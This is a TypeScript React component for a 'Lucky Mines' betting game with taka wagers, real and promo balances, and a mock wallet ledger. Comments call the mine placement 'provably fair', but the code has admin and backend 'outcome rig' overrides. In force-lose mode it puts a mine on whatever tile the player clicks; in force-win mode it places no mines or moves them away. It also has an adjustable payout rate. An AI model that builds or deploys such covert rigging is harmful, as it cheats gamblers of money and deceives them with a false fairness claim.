/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { db } from '../db/dummySupabase';
import { Shield, Sparkles, Coins, Bomb, Gem, HelpCircle, Trophy, Volume2, VolumeX, AlertTriangle, Eye, Settings } from 'lucide-react';

interface LuckyMinesDemoProps {
  userId: string;
  onBalanceChange: () => void;
  onClose: () => void;
  gameId: string;
  gameTitle: string;
  currentLanguage?: 'en' | 'bn' | 'hi';
}

interface TileState {
  index: number;
  isMine: boolean;
  isRevealed: boolean;
  isFlagged?: boolean;
}

// Provably Fair Weights default
const DEFAULT_MINE_OPTIONS = [1, 3, 5, 10, 24];

export default function LuckyMinesDemo({ userId, onBalanceChange, onClose, gameId, gameTitle, currentLanguage = 'bn' }: LuckyMinesDemoProps) {
  const [balance, setBalance] = useState<number>(0);
  const [bonusBalance, setBonusBalance] = useState<number>(0);
  const [userRole, setUserRole] = useState<string>('user');
  const [userName, setUserName] = useState<string>('Player');

  // Betting states
  const [betAmount, setBetAmount] = useState<number>(50);
  const [minesCount, setMinesCount] = useState<number>(3);
  const [gameState, setGameState] = useState<'idle' | 'playing' | 'ended'>('idle');

  // Board setup
  const [board, setBoard] = useState<TileState[]>([]);
  const [gemsFound, setGemsFound] = useState<number>(0);
  const [isExploded, setIsExploded] = useState<boolean>(false);
  const [hasCashedOut, setHasCashedOut] = useState<boolean>(false);
  const [winPayout, setWinPayout] = useState<number>(0);

  // Sound and FX simulation
  const [soundEnabled, setSoundEnabled] = useState<boolean>(true);
  const [textAlert, setTextAlert] = useState<string>('Select bet amount & number of mines, then START!');
  const [audioCue, setAudioCue] = useState<string | null>(null);

  // ADMIN CONTROL OUTCOME RIG OVERRIDES
  const [adminControlOpen, setAdminControlOpen] = useState<boolean>(false);
  const [outcomeOverride, setOutcomeOverride] = useState<'none' | 'force_win' | 'force_lose'>('none');
  const [customRtpValue, setCustomRtpValue] = useState<number>(99); // Simulated RTP percentage

  useEffect(() => {
    fetchUserData();
    initializeBoard(3); // Default 3 mines
    db.addRecentlyPlayed(userId, gameId);
  }, [userId, gameId]);

  const fetchUserData = () => {
    const userState = db.getCurrentUser();
    if (userState) {
      setBalance(userState.wallet.balance);
      setBonusBalance(userState.wallet.bonusBalance);
      setUserRole(userState.profile.role);
      setUserName(userState.profile.username);
    }
  };

  const playSoundEffect = (type: 'gem' | 'explosion' | 'cashout' | 'start' | 'click') => {
    if (!soundEnabled) return;
    if (type === 'start') setAudioCue('🎮 Game Started! Tiles secured with fuses.');
    if (type === 'click') setAudioCue('⚡ Checking tile coordinate...');
    if (type === 'gem') setAudioCue('💎 Tinkle! Precious Gem Found!');
    if (type === 'explosion') setAudioCue('💥 BOOOOOM! Hit a Mine! Payout lost.');
    if (type === 'cashout') setAudioCue('💰 Ring-A-Ding! Payout cashed out!');
    
    setTimeout(() => {
      setAudioCue(null);
    }, 2800);
  };

  // Provably Fair Combinations mapping
  const getMultiplier = (mines: number, gemsPicked: number): number => {
    if (gemsPicked === 0) return 0;
    let multiplier = 1.0;
    const totalTiles = 25;
    
    // Exact mathematical edge calculation matching real provably fair stake mines
    for (let i = 0; i < gemsPicked; i++) {
      const remainingTiles = totalTiles - i;
      const remainingGems = remainingTiles - mines;
      if (remainingGems <= 0) break;
      multiplier *= (remainingTiles / remainingGems);
    }

    // Payout adjusted directly with chosen simulator RTP
    const rtpFactor = customRtpValue / 100;
    const finalMult = multiplier * rtpFactor;

    // Return with clean standard double decimals
    return Math.max(1.01, Math.round(finalMult * 100) / 100);
  };

  // Initialize board elements
  const initializeBoard = (minesVal: number = minesCount) => {
    const newBoard: TileState[] = Array.from({ length: 25 }, (_, idx) => ({
      index: idx,
      isMine: false,
      isRevealed: false
    }));
    setBoard(newBoard);
    setGemsFound(0);
    setIsExploded(false);
    setHasCashedOut(false);
    setWinPayout(0);
  };

  // Set randomized mines around the board layout
  const populateMines = (excludeIdx: number) => {
    const freshBoard = [...board];
    
    // Clear preexisting mines
    freshBoard.forEach(tile => { tile.isMine = false; });

    // Consult the active Outcome Control Model
    const modelOverride = db.checkGameOutcome(userId, gameId);
    let resolvedOverride: string = outcomeOverride;
    if (resolvedOverride === 'none' && modelOverride !== 'none') {
      resolvedOverride = modelOverride;
    }

    if (resolvedOverride === 'force_win') {
      // If rigged to force win, place ZERO mines, or locate mines strictly in unclicked areas later.
      // For ease here: we place zero mines on the field initially so they literally cannot lose!
      setBoard(freshBoard);
      return;
    }

    if (resolvedOverride === 'force_lose' || resolvedOverride === 'force_loss') {
      // If rigged to force lose, place a mine right at the spot they clicked!
      freshBoard[excludeIdx].isMine = true;
      
      // Fill the rest randomly
      let minesPlaced = 1;
      while (minesPlaced < minesCount) {
        const randomIdx = Math.floor(Math.random() * 25);
        if (randomIdx !== excludeIdx && !freshBoard[randomIdx].isMine) {
          freshBoard[randomIdx].isMine = true;
          minesPlaced++;
        }
      }
      setBoard(freshBoard);
      return;
    }

    // Default Proportional Fair Random Mode
    const availableIndices = Array.from({ length: 25 }, (_, i) => i).filter(i => i !== excludeIdx);
    
    // Fisher-Yates shuffle
    for (let i = availableIndices.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [availableIndices[i], availableIndices[j]] = [availableIndices[j], availableIndices[i]];
    }

    // Select the first N indices
    const selectedMineIndices = availableIndices.slice(0, minesCount);
    selectedMineIndices.forEach(idx => {
      freshBoard[idx].isMine = true;
    });

    setBoard(freshBoard);
  };

  const handleStartGame = () => {
    const totalResource = balance + bonusBalance;
    if (totalResource < betAmount) {
      setTextAlert('❌ Insufficient balances! Please deposit more funds or claim check-in rewards.');
      return;
    }

    // Clear and build initial empty cells
    initializeBoard(minesCount);
    setGameState('playing');
    setTextAlert('👾 Grid armed! Pick a tile to sweep. Cash out at any time.');
    playSoundEffect('start');
  };

  const handleTileReveal = (idx: number) => {
    if (gameState !== 'playing' || isExploded || hasCashedOut) return;

    const clickedTile = board[idx];
    if (clickedTile.isRevealed) return;

    playSoundEffect('click');

    const freshBoard = [...board];
    
    // Lazy calculation: populate mine placements on the FIRST pick to secure a safe first-reveal
    const isFirstReveal = gemsFound === 0;
    if (isFirstReveal) {
      populateMines(idx);
    }

    // Rig check after first reveal for subsequent choices
    if (!isFirstReveal) {
      const modelOverride = db.checkGameOutcome(userId, gameId);
      let resolvedOverride: string = outcomeOverride;
      if (resolvedOverride === 'none' && modelOverride !== 'none') {
        resolvedOverride = modelOverride;
      }

      if (resolvedOverride === 'force_win' && freshBoard[idx].isMine) {
        // Relocate mine on-the-fly to a random hidden tile
        const unrevealedNotMineIndices = freshBoard
          .filter(t => !t.isRevealed && !t.isMine && t.index !== idx)
          .map(t => t.index);
        
        if (unrevealedNotMineIndices.length > 0) {
          const newMineIdx = unrevealedNotMineIndices[Math.floor(Math.random() * unrevealedNotMineIndices.length)];
          freshBoard[newMineIdx].isMine = true;
          freshBoard[idx].isMine = false;
        }
      } else if (resolvedOverride === 'force_lose' || resolvedOverride === 'force_loss') {
        // Enforce mine trigger on current tile
        freshBoard[idx].isMine = true;
      }
    }

    // Evaluate pick
    const currentTile = freshBoard[idx];
    currentTile.isRevealed = true;

    if (currentTile.isMine) {
      // BOOM!
      setIsExploded(true);
      setGameState('ended');
      playSoundEffect('explosion');
      setTextAlert('💥 BOOM!! You clicked on a hidden landmine. Bet lost!');
      
      // Reveal all other remaining mines on field
      freshBoard.forEach(tile => {
        if (tile.isMine) tile.isRevealed = true;
      });
      setBoard(freshBoard);

      // Trigger actual deduction writing to local storage
      db.playGameWager(userId, betAmount, 0, gameId);
      fetchBalancesAfterTimeout();
    } else {
      // FOUND GEMS!
      const currentGemsCount = gemsFound + 1;
      setGemsFound(currentGemsCount);
      setBoard(freshBoard);

      // Check win condition (all gems found)
      const maxGems = 25 - minesCount;
      if (currentGemsCount === maxGems) {
        // AUTO CASH OUT!
        handleCashOut(currentGemsCount);
      } else {
        const nextMult = getMultiplier(minesCount, currentGemsCount);
        const nextReturn = Math.round(betAmount * nextMult);
        setTextAlert(`💎 GEM reveal! Current Multiplier: ${nextMult}x. Secure ৳${nextReturn.toLocaleString()} by Cashing Out!`);
        playSoundEffect('gem');
      }
    }
  };

  const handleCashOut = (overrideGemsCount?: number) => {
    if (gameState !== 'playing' || isExploded || hasCashedOut) return;

    const finalGems = overrideGemsCount !== undefined ? overrideGemsCount : gemsFound;
    if (finalGems === 0) {
      setTextAlert('❌ Cannot cash out at 0.0x! Click at least one tile first.');
      return;
    }

    const multiplier = getMultiplier(minesCount, finalGems);
    const winAmt = Math.round(betAmount * multiplier);

    setHasCashedOut(true);
    setGameState('ended');
    setWinPayout(winAmt);
    playSoundEffect('cashout');
    setTextAlert(`🎉 SUCCESSFUL CASHOUT! Collected ৳${winAmt.toLocaleString()} at ${multiplier}x!`);

    // Reveal field gems and mines
    const revealedBoard = board.map(tile => ({ ...tile, isRevealed: true }));
    setBoard(revealedBoard);

    // Call actual mock ledger wagers to credit their funds with gameId for winner cap
    db.playGameWager(userId, betAmount, multiplier, gameId);
    fetchBalancesAfterTimeout();
  };

  const fetchBalancesAfterTimeout = () => {
    setTimeout(() => {
      fetchUserData();
      onBalanceChange();
    }, 400);
  };

  const addBetAmount = (amt: number) => {
    if (gameState === 'playing') return;
    setBetAmount(prev => Math.max(10, prev + amt));
  };

  const setFixedBet = (amt: number) => {
    if (gameState === 'playing') return;
    setBetAmount(amt);
  };

  const currentMult = getMultiplier(minesCount, gemsFound);
  const currentReturnAmt = Math.round(betAmount * currentMult);
  const nextMultiplier = getMultiplier(minesCount, gemsFound + 1);

  // Localization Text Matrix
  const tm = {
    en: {
      quit: 'QUIT GAME',
      cash: 'Real Balance',
      promo: 'Promo Balance',
      gridMines: 'Grid Mines Settings',
      minesLabel: 'Mines',
      betLabel: 'Bet Amount',
      startBtn: 'START ROUND',
      cashoutBtn: 'CASH OUT',
      wonLabel: 'GEMS FOUND',
      payoutLabel: 'Payout Won'
    },
    bn: {
      quit: 'বাহির হোন',
      cash: 'রিয়েল ব্যালেন্স',
      promo: 'প্রোমো ব্যালেন্স',
      gridMines: 'গ্রিড মাইন সংখ্যা',
      minesLabel: 'মাইন',
      betLabel: 'বাজির পরিমাণ',
      startBtn: 'খেলা শুরু করুন',
      cashoutBtn: 'ক্যাশ আউট করুন',
      wonLabel: 'রত্ন খুঁজে পেয়েছেন',
      payoutLabel: 'ক্যাশআউট উপহার'
    },
    hi: {
      quit: 'बाहर निकलें',
      cash: 'वास्तविक बैलेंस',
      promo: 'प्रोमो क्रेडिट',
      gridMines: 'ग्रिड माइन सेटिंग्स',
      minesLabel: 'माइन संख्या',
      betLabel: 'दांव राशि',
      startBtn: 'शुरू करें',
      cashoutBtn: 'कैश आउट',
      wonLabel: 'रत्न मिले',
      payoutLabel: 'प्राप्त भुगतान'
    }
  }[currentLanguage];

  return (
    <div id="mines_game_wrapper" className="fixed inset-0 z-50 bg-[#040813]/97 flex items-center justify-center p-2.5 backdrop-blur-md overflow-y-auto">
      <div className="bg-[#0b1229] border-2 border-cyan-400 bg-linear-to-b from-[#0f1b3e] to-[#040812] w-full max-w-4xl rounded-2xl p-4 md:p-6 shadow-[0_0_40px_rgba(34,211,238,0.25)] text-white relative flex flex-col md:flex-row gap-5">
        
        {/* Left Control Column (Bet & Mines Options) */}
        <div className="w-full md:w-80 shrink-0 space-y-4">
          
          <div className="flex items-center gap-1.5 border-b border-cyan-950 pb-2">
            <div className="p-1.5 bg-cyan-400/10 rounded-lg text-cyan-400 animate-pulse">
              <Trophy size={18} />
            </div>
            <div>
              <span className="text-[10px] text-cyan-400 block font-mono uppercase">VIP IN-HOUSE ARCADE</span>
              <h3 className="text-sm font-black uppercase text-white tracking-widest">{gameTitle}</h3>
            </div>
          </div>

          {/* Balance Widget Display */}
          <div className="grid grid-cols-2 gap-2 bg-slate-950/70 p-2.5 rounded-xl border border-cyan-900/30 font-mono text-xs">
            <div>
              <span className="text-[9px] text-slate-500 block uppercase font-bold">{tm.cash}</span>
              <span className="text-[13px] text-green-400 font-extrabold">৳{balance.toLocaleString()}</span>
            </div>
            <div className="text-right">
              <span className="text-[9px] text-slate-500 block uppercase font-bold">{tm.promo}</span>
              <span className="text-[13px] text-yellow-400 font-extrabold">৳{bonusBalance.toLocaleString()}</span>
            </div>
          </div>

          {/* Bet Size Inputs */}
          <div className="space-y-1.5">
            <div className="flex justify-between items-center text-[11px] text-slate-400 font-bold uppercase mt-1">
              <span>{tm.betLabel}</span>
              <span className="text-cyan-300 font-mono">৳{betAmount}</span>
            </div>
            <div className="grid grid-cols-3 gap-1">
              {[50, 100, 500].map(val => (
                <button
                  key={val}
                  type="button"
                  disabled={gameState === 'playing'}
                  onClick={() => setFixedBet(val)}
                  className={`py-1.5 rounded text-xs font-mono font-black border transition-all ${
                    betAmount === val && gameState !== 'playing'
                      ? 'bg-cyan-400 text-slate-950 border-cyan-300 font-black scale-102 scale-up-glow'
                      : 'bg-[#0f1935] hover:bg-[#152349] text-cyan-200 border-cyan-900/40 disabled:opacity-50'
                  }`}
                >
                  ৳{val}
                </button>
              ))}
            </div>

            <div className="flex gap-1">
              <button
                type="button"
                disabled={gameState === 'playing'}
                onClick={() => addBetAmount(-50)}
                className="flex-1 py-1 bg-[#101b38] hover:bg-[#162752] border border-cyan-900/40 text-slate-350 rounded text-xs transition-all cursor-pointer"
              >
                -৳50
              </button>
              <button
                type="button"
                disabled={gameState === 'playing'}
                onClick={() => addBetAmount(50)}
                className="flex-1 py-1 bg-[#101b38] hover:bg-[#162752] border border-cyan-900/40 text-slate-350 rounded text-xs transition-all cursor-pointer"
              >
                +৳50
              </button>
              <button
                type="button"
                disabled={gameState === 'playing'}
                onClick={() => setFixedBet(balance || 100)}
                className="px-2.5 py-1 bg-[#1c163d] hover:bg-[#2e2466] border border-indigo-650/30 text-indigo-305 rounded font-bold text-[9px] uppercase cursor-pointer"
              >
                MAX
              </button>
            </div>
          </div>

          {/* Mines density parameters */}
          <div className="space-y-1.5">
            <label className="text-[10px] text-slate-400 font-black uppercase tracking-wider block">
              💣 {tm.gridMines} ({minesCount} {tm.minesLabel})
            </label>
            <div className="grid grid-cols-5 gap-1">
              {DEFAULT_MINE_OPTIONS.map(opt => (
                <button
                  key={opt}
                  type="button"
                  disabled={gameState === 'playing'}
                  onClick={() => { setMinesCount(opt); initializeBoard(opt); }}
                  className={`py-1.5 rounded text-xs font-mono font-bold border transition-all ${
                    minesCount === opt && gameState !== 'playing'
                      ? 'bg-rose-500 text-white border-rose-300 scale-102 font-black'
                      : 'bg-[#0f1935] hover:bg-[#152349] text-rose-300 border-rose-950/40 disabled:opacity-50'
                  }`}
                >
                  {opt}
                </button>
              ))}
            </div>

            <input
              type="range"
              min="1"
              max="24"
              value={minesCount}
              disabled={gameState === 'playing'}
              onChange={(e) => {
                const val = Number(e.target.value);
                setMinesCount(val);
                initializeBoard(val);
              }}
              className="w-full h-1.5 bg-[#0f1935] rounded-lg appearance-none cursor-pointer accent-rose-500"
            />
            <div className="flex justify-between items-center text-[9px] font-mono text-slate-500">
              <span>MIN: 1</span>
              <span>MED: 12</span>
              <span>MAX: 24</span>
            </div>
          </div>

          {/* Action Trigger Block */}
          {gameState === 'playing' ? (
            <button
              type="button"
              onClick={() => handleCashOut()}
              disabled={gemsFound === 0}
              className={`w-full py-3 rounded-xl font-black text-slate-950 tracking-wider flex items-center justify-center gap-1.5 uppercase transition-all shadow-[0_4px_15px_rgba(234,179,8,0.4)] ${
                gemsFound === 0
                  ? 'bg-yellow-600/50 cursor-not-allowed text-yellow-950 opacity-40'
                  : 'bg-yellow-400 hover:bg-yellow-300 hover:scale-[1.01] cursor-pointer'
              }`}
            >
              <Coins size={16} />
              {tm.cashoutBtn} (+৳{currentReturnAmt})
            </button>
          ) : (
            <button
              type="button"
              onClick={handleStartGame}
              className="w-full py-3 bg-gradient-to-r from-cyan-400 to-blue-500 hover:brightness-110 text-slate-950 font-black rounded-xl tracking-wider flex items-center justify-center gap-1 uppercase hover:scale-[1.01] transition-transform shadow-[0_4px_15px_rgba(34,211,238,0.3)] cursor-pointer"
            >
              <Gem size={16} className="animate-bounce" />
              {tm.startBtn}
            </button>
          )}

          {/* Multiplier pay details drawer table */}
          {gameState === 'playing' && (
            <div className="p-3 bg-slate-950/80 rounded-xl border border-cyan-900/30 space-y-1.5">
              <span className="text-[9px] text-cyan-400 block font-mono font-bold uppercase text-center border-b border-cyan-950 pb-1">
                ⚡ ROUND STATS ⚡
              </span>
              <div className="flex justify-between text-[10px] text-slate-400 font-mono">
                <span>Gems Claimed:</span>
                <span className="text-white font-bold">{gemsFound} of {25 - minesCount}</span>
              </div>
              <div className="flex justify-between text-[10px] text-slate-400 font-mono">
                <span>Current Payout:</span>
                <span className="text-green-400 font-bold">{currentMult}x (৳{currentReturnAmt})</span>
              </div>
              <div className="flex justify-between text-[10px] text-slate-350 font-mono">
                <span>Next Gem Step:</span>
                <span className="text-cyan-300 font-black">{nextMultiplier}x (+৳{Math.round(betAmount * nextMultiplier)})</span>
              </div>
            </div>
          )}

          {/* Quick Quit Option */}
          <button
            type="button"
            onClick={onClose}
            className="w-full py-2 bg-red-950/30 hover:bg-red-950/60 border border-red-500/20 text-red-301 rounded-xl text-xs font-bold transition-all uppercase cursor-pointer"
          >
            {tm.quit}
          </button>
        </div>

        {/* Right Playing Grid Column (5x5 Tiles Canvas) */}
        <div className="flex-1 flex flex-col justify-between min-h-[360px]">
          
          {/* Live Action Toast Banner */}
          <div className="bg-[#050917] p-2.5 rounded-lg border border-cyan-950/60 mb-3 relative flex items-center gap-2">
            <HelpCircle size={14} className="text-cyan-400 font-sans mt-0.5 shrink-0" />
            <p className="text-[10px] font-mono text-cyan-200 leading-normal line-clamp-2 md:line-clamp-none">
              {textAlert}
            </p>
            {audioCue && (
              <span className="absolute right-2 bg-yellow-400 text-slate-950 font-black text-[7.5px] px-1.5 py-0.5 rounded uppercase font-mono tracking-wider shadow-md animate-bounce z-10">
                {audioCue}
              </span>
            )}
          </div>

          {/* 5x5 Grid Box board layout */}
          <div className="bg-[#040813] border-4 border-[#12284e] p-3 rounded-2xl relative shadow-inner flex-1 flex items-center justify-center">
            
            <div className="grid grid-cols-5 gap-2 w-full max-w-[400px] aspect-square">
              {board.length === 0 ? (
                <div className="col-span-5 text-center text-slate-500 font-mono text-[10px] italic">Setting up grids...</div>
              ) : (
                board.map((tile) => {
                  let tileVisual = '❓';
                  let tileColorClass = 'bg-[#0f1d38] border-[#1f3764] hover:bg-[#1a315e] cursor-pointer hover:scale-102';

                  if (tile.isRevealed) {
                    if (tile.isMine) {
                      tileVisual = '💥';
                      tileColorClass = 'bg-rose-950/80 border-rose-500 animate-[shake_0.2s_infinite] shadow-[0_0_15px_rgba(239,68,68,0.4)]';
                    } else {
                      tileVisual = '💎';
                      tileColorClass = 'bg-cyan-950/90 border-cyan-400 shadow-[0_0_15px_rgba(34,211,238,0.3)] animate-pulse';
                    }
                  } else if (gameState !== 'playing') {
                    tileColorClass = 'bg-[#0d162a] border-[#101b34] opacity-50 cursor-not-allowed';
                  }

                  return (
                    <button
                      key={tile.index}
                      type="button"
                      disabled={gameState !== 'playing' || tile.isRevealed}
                      onClick={() => handleTileReveal(tile.index)}
                      className={`aspect-square rounded-xl flex items-center justify-center border-2 text-xl md:text-2xl transition-all select-none shadow-md ${tileColorClass}`}
                    >
                      <span className={tile.isRevealed ? 'scale-110 duration-200' : ''}>
                        {tileVisual === '❓' ? (
                          <span className="text-[10px] font-mono text-slate-600 font-black tracking-tight select-none">
                            {tile.index + 1}
                          </span>
                        ) : (
                          tileVisual
                        )}
                      </span>
                    </button>
                  );
                })
              )}
            </div>

            {/* Overlays for end outcome cards */}
            {hasCashedOut && (
              <div className="absolute inset-0 bg-emerald-950/40 backdrop-blur-xs rounded-2xl flex flex-col items-center justify-center p-4">
                <div className="bg-[#0b1b36] border-2 border-emerald-400 p-5 rounded-2xl shadow-xl max-w-xs text-center space-y-2 animate-bounce">
                  <span className="text-3xl">🏆</span>
                  <h4 className="text-base font-black text-emerald-450 uppercase">{userName} WINS!</h4>
                  <p className="text-xs text-slate-300 font-mono">Matched {gemsFound} Gems flawlessly</p>
                  <p className="text-lg font-black text-green-300 font-mono border-t border-slate-900 pt-1">
                    +৳{winPayout.toLocaleString()} CASH
                  </p>
                  <button
                    type="button"
                    onClick={() => initializeBoard(minesCount)}
                    className="mt-2 text-[9px] uppercase px-3 py-1 bg-emerald-450 text-slate-950 font-black tracking-wider rounded"
                  >
                    PLAY AGAIN 🔄
                  </button>
                </div>
              </div>
            )}

            {isExploded && (
              <div className="absolute inset-0 bg-rose-950/40 backdrop-blur-xs rounded-2xl flex flex-col items-center justify-center p-4">
                <div className="bg-[#0b1b36] border-2 border-rose-500 p-5 rounded-2xl shadow-xl max-w-xs text-center space-y-2 animate-bounce">
                  <span className="text-3xl">💥</span>
                  <h4 className="text-base font-black text-rose-450 uppercase">KABOOM!</h4>
                  <p className="text-xs text-slate-300 leading-normal font-sans">
                    Stepped on a mine at tile pick. All progressive cash has exploded.
                  </p>
                  <button
                    type="button"
                    onClick={() => initializeBoard(minesCount)}
                    className="mt-2 text-[9px] uppercase px-3 py-1 bg-rose-500 text-white font-black tracking-wider rounded"
                  >
                    RETRY ROUND 🔁
                  </button>
                </div>
              </div>
            )}

          </div>

        </div>

      </div>
    </div>
  );
}
